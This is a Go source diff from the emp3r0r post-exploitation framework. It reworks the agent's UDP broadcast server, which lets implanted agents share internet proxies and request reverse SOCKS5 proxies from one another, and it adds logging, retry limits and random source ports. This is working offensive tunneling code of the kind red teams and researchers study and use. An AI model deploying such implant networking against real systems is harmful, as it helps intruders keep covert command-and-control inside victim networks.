@@ -14,12 +14,13 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
+var ReverseConns []string // remember reverse proxies
+
 // BroadcastServer listen on a UDP port for broadcasts
 // wait for some other agents to announce their internet proxy
 func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
-		passProxyCnt int      // one time only
-		reverseConns []string // remember reverse proxies
+		passProxyCnt int // one time only
 	)
 	defer cancel()
 	pc, err := net.ListenPacket("udp4", ":"+BroadcastPort)
@@ -27,6 +28,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 		return
 	}
 	defer pc.Close()
+	log.Println("BroadcastServer started")
 
 	buf := make([]byte, 1024)
 
@@ -52,11 +54,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 		hasInternet := tun.HasInternetAccess()
 		isProxyOK := tun.IsProxyOK(AgentProxy)
 		if hasInternet || isProxyOK {
-			// ignore proxy msg
-			if strings.HasPrefix(decMsg, "socks5://") {
-				continue
-			}
-
+			log.Println("BroadcastServer: listening for reverse proxy requests")
 			// if addr is invalid, continue
 			if !tun.ValidateIPPort(decMsg) {
 				log.Printf("Invalid address %s, no reverse proxy will be provided", decMsg)
@@ -65,14 +63,14 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 
 			// this msg tells us to provide a reverse proxy
 			go func() {
-				for _, p := range reverseConns {
+				for _, p := range ReverseConns {
 					if decMsg == p {
 						log.Printf("We already have a reverse proxy for %s", decMsg)
 						return
 					}
 				}
 				// where to forward? local proxy or remote one?
-				toAddr := "127.0.0.1" + ProxyPort
+				toAddr := "127.0.0.1:" + ProxyPort
 				if !hasInternet {
 					toAddr = AgentProxy
 				}
@@ -80,7 +78,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 				if err != nil {
 					log.Printf("TCPConnJoin: %v", err)
 				}
-				reverseConns = append(reverseConns, decMsg)
+				ReverseConns = append(ReverseConns, decMsg)
 			}()
 		}
 
@@ -91,13 +89,16 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 			log.Printf("BroadcastServer: %s already set and working fine\n", AgentProxy)
 			continue
 		}
+
 		if tun.IsProxyOK(decMsg) {
 			AgentProxy = decMsg
 			log.Printf("BroadcastServer: %s set as AgentProxy\n", AgentProxy)
 
 			// pass the proxy to others
 			go passProxy(ctx, cancel, &passProxyCnt)
+
 		} else {
+			log.Printf("Oh crap! %s doen't work, we have to request a reverse proxy", decMsg)
 			// if proxy is not reachable, we ask the proxy server to connect to us
 			// and use a socks5://127.0.0.1:port proxy
 			p, err := strconv.Atoi(ProxyPort)
@@ -116,6 +117,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 					return
 				}
 				defer l.Close()
+				log.Printf("reverse proxy request: callback on %s", reverseProxyAddr)
 				for ctx.Err() == nil {
 					reverseConn, err := l.Accept()
 					if err != nil {
@@ -132,23 +134,31 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 			for _, ipnetstr := range tun.IPa() {
 				selfaddr := strings.Split(ipnetstr, "/")[0]
 				rproxymsg := fmt.Sprintf("%s:%d", selfaddr, reverseProxyPort)
-				log.Printf("Sending %s on network %s", rproxymsg, addr)
-				_, _ = pc.WriteTo([]byte(rproxymsg), addr) // send message
+				err = BroadcastMsg(rproxymsg, addr.String())
+				if err != nil {
+					log.Printf("Send reverse proxy request to %s failed: %v", addr, err)
+					continue
+				}
+				log.Printf("Sending reverse proxy request %s to %s", strconv.Quote(rproxymsg), addr)
 			}
 
 			rproxy := fmt.Sprintf("socks5://127.0.0.1:%s", ProxyPort)
-			for !tun.IsProxyOK(rproxy) {
+			retry := 0 // don't stuck here
+			for !tun.IsProxyOK(rproxy) && retry < 15 {
+				retry++
 				time.Sleep(time.Second)
 			}
-			AgentProxy = rproxy
-			log.Printf("[+] Reverse proxy configured to %s", rproxy)
+			if tun.IsProxyOK(rproxy) {
+				AgentProxy = rproxy
+				log.Printf("[+] Reverse proxy configured to %s", rproxy)
+			}
 		}
 	}
 	return
 }
 
 func serveReverseConn(rconn net.Conn, ctx context.Context) {
-	l, err := net.Listen("tcp", "0.0.0.0:"+ProxyPort)
+	l, err := net.Listen("tcp", "0.0.0.0:"+ProxyPort) // local socks5
 	if err != nil {
 		log.Printf("bind: %v", err)
 		return
@@ -203,13 +213,15 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 
 // BroadcastMsg send a broadcast message on a network
 func BroadcastMsg(msg, dst string) (err error) {
-	pc, err := net.ListenPacket("udp4", ":8887")
+	srcport := strconv.Itoa(util.RandInt(8000, 60000))
+	pc, err := net.ListenPacket("udp4", ":"+srcport)
 	if err != nil {
 		return
 	}
 	defer pc.Close()
 
-	addr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%s", dst, BroadcastPort))
+	// send to specified addr by default
+	addr, err := net.ResolveUDPAddr("udp4", dst)
 	if err != nil {
 		return
 	}
@@ -241,14 +253,6 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 		}()
 	}
 
-	// also listen for broadcasts in case some agents want use to connect to them
-	go func() {
-		err := BroadcastServer(ctx, cancel)
-		if err != nil {
-			log.Printf("BroadcastServer: %v", err)
-		}
-	}()
-
 	defer func() {
 		log.Print("Broadcasting stopped")
 		cancel()
@@ -263,7 +267,7 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 			if broadcastAddr == "" {
 				continue
 			}
-			err := BroadcastMsg(proxyMsg, broadcastAddr)
+			err := BroadcastMsg(proxyMsg, broadcastAddr+":"+BroadcastPort)
 			if err != nil {
 				log.Printf("BroadcastMsg failed: %v", err)
 			}
